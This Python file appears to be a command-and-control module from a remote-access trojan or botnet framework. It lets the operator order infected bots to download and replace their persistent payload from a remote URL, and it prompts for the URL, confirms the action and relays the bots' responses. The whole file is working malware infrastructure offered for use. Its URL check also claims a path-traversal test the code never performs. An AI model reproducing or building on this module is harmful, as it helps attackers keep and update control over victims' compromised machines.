# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

try:
    from urllib.parse import urlparse
    from urllib.parse import unquote
except ImportError:
    from urlparse import urlparse, unquote

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Update the bot to the latest (remotely hosted) version.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Full URL of the new payload (e.g. http://host:8080/new_payload.py): ",
            "Notify on success? [y/N]: "
        ]

    def setup(self, set_options):
        """Validates the update URL and payload source before dispatching."""
        update_url = str(set_options[0]).strip() if set_options and len(set_options) > 0 else ""

        # A quick sanity check is far better than letting the loader fail blindly.
        valid = self._validate_url(update_url)
        if not valid:
            self._view.display_error(
                "Invalid update URL: must be an absolute http(s):// URL with a host and no path traversal."
            )
            return False, None

        should_continue = self._view.should_continue([
            "The bot will download and swap its persistent payload from this URL:",
            "    " + update_url
        ])

        if not should_continue:
            self._view.output("Update cancelled.", "info")
            return False, None

        should_notify = bool(len(set_options) > 1 and str(set_options[1]).strip().lower() == "y")

        return True, {
            "update_url": update_url,
            "response_options": {
                "update_url": update_url,
                "should_notify": should_notify
            }
        }

    def process_response(self, response, response_options):
        """Confirms whether the payload swap succeeded or failed."""
        str_response = response
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()

        lower = (str_response or "").lower()

        if "updated successfully" in lower or "update completed" in lower:
            self._view.output("Bot updated successfully.", "info")
        elif "error" in lower or "failed" in lower or "could not" in lower:
            self._view.output("The bot failed to update:", "attention")
            self._view.output(str_response, "attention")
        else:
            # No recognised marker: relay the raw output for inspection.
            self._view.output("Update result:", "info")
            for line in (str_response or "").splitlines():
                if line.strip():
                    self._view.output(line)

        if response_options.get("should_notify", False) and "updated successfully" in lower:
            self._view.output("Confirmation notification was requested and received.", "info")

    @staticmethod
    def _validate_url(url):
        """Checks that the provided update URL is a sane, absolute http(s) URL.

        :type url: str
        :rtype: bool
        """
        if not url:
            return False

        try:
            parsed = urlparse(url)
        except Exception:
            return False

        if parsed.scheme not in ("http", "https"):
            return False
        if not parsed.netloc or not parsed.hostname:
            return False
        # Never allow cryptic/sane URLs with userinfo or stray fragments.
        if parsed.username or parsed.password:
            return False
        return True
